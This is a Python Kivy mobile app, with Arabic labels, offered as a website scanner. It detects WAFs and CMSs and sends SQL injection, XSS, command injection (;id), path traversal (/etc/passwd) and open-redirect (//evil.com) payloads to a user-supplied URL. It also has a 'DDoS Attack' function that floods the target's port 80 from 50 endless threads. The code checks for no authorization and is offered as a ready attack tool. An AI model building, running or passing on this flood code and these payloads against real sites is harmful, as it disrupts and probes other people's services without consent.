from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.core.window import Window
import threading
import requests
import socket

Window.size = (400, 700)

class ScannerLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', spacing=10, padding=10, **kwargs)

        self.url_input = TextInput(hint_text='ادخل رابط الموقع http://...', size_hint=(1, None), height=50)
        self.add_widget(self.url_input)

        self.result_box = TextInput(readonly=True, size_hint=(1, 0.7),
                                    background_color=(0, 0, 0, 1), foreground_color=(0, 1, 0, 1))
        self.add_widget(self.result_box)

        btns = [
            ('فحص WAF', self.scan_waf),
            ('كشف CMS', self.detect_cms),
            ('فحص ثغرات', self.scan_vulns),
            ('DDoS Attack', self.launch_ddos),
            ('حفظ النتائج', self.save_results),
        ]

        for text, func in btns:
            btn = Button(text=text, size_hint=(1, None), height=45)
            btn.bind(on_press=lambda inst, f=func: f())
            self.add_widget(btn)

    def log(self, msg):
        self.result_box.text += f"{msg}\n"

    def get_url(self):
        url = self.url_input.text.strip()
        if not url.startswith('http'):
            url = 'http://' + url
        return url

    def scan_waf(self):
        url = self.get_url()
        try:
            headers = {'User-Agent': 'Mozilla/5.0', 'X-Forwarded-For': '127.0.0.1'}
            r = requests.get(url, headers=headers, timeout=10)
            waf_signatures = ['cloudflare', 'sucuri', 'aws', 'incapsula', 'akamai']
            waf_found = any(sig in r.headers.get('Server', '').lower() for sig in waf_signatures)
            self.log("[+] WAF Detected" if waf_found else "[-] No WAF Detected")
        except Exception as e:
            self.log(f"[!] Error: {e}")

    def detect_cms(self):
        url = self.get_url()
        try:
            r = requests.get(url, timeout=10).text.lower()
            if 'wp-content' in r:
                self.log("[+] WordPress Detected")
            elif 'joomla' in r:
                self.log("[+] Joomla Detected")
            elif 'drupal' in r:
                self.log("[+] Drupal Detected")
            else:
                self.log("[-] CMS Unknown")
        except Exception as e:
            self.log(f"[!] Error: {e}")

    def scan_vulns(self):
        url = self.get_url()
        payloads = [
            ("SQLi", "' or 1=1--"),
            ("XSS", "<script>alert('x')</script>"),
            ("Command Injection", ";id"),
            ("LFI", "../../../../etc/passwd"),
            ("Open Redirect", "//evil.com")
        ]
        self.log("[~] Starting Vulnerability Scan...")
        for name, payload in payloads:
            try:
                target = url + ("?v=" + payload if '?' not in url else "&v=" + payload)
                r = requests.get(target, timeout=8)
                if name == "XSS" and payload in r.text:
                    self.log(f"[+] XSS detected: {target}")
                elif name == "SQLi" and 'sql' in r.text.lower():
                    self.log(f"[+] SQLi detected: {target}")
                elif name == "Command Injection" and 'uid=' in r.text:
                    self.log(f"[+] Command Injection: {target}")
                elif name == "LFI" and 'root:' in r.text:
                    self.log(f"[+] LFI Found: {target}")
                elif name == "Open Redirect" and 'evil.com' in r.url:
                    self.log(f"[+] Open Redirect: {target}")
            except:
                pass

    def launch_ddos(self):
        url = self.get_url()
        host = url.replace('http://', '').replace('https://', '').split('/')[0]
        port = 80

        def attack():
            while True:
                try:
                    s = socket.socket()
                    s.connect((host, port))
                    s.send(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % host.encode())
                    s.close()
                except:
                    pass

        for _ in range(50):
            threading.Thread(target=attack, daemon=True).start()

        self.log("[!] DDoS Started with 50 Threads")

    def save_results(self):
        try:
            with open("report.txt", "w", encoding="utf-8") as f:
                f.write(self.result_box.text)
            self.log("[+] Report saved to report.txt")
        except Exception as e:
            self.log(f"[!] Save failed: {e}")

class WebScannerApp(App):
    def build(self):
        return ScannerLayout()

if __name__ == '__main__':
    WebScannerApp().run()
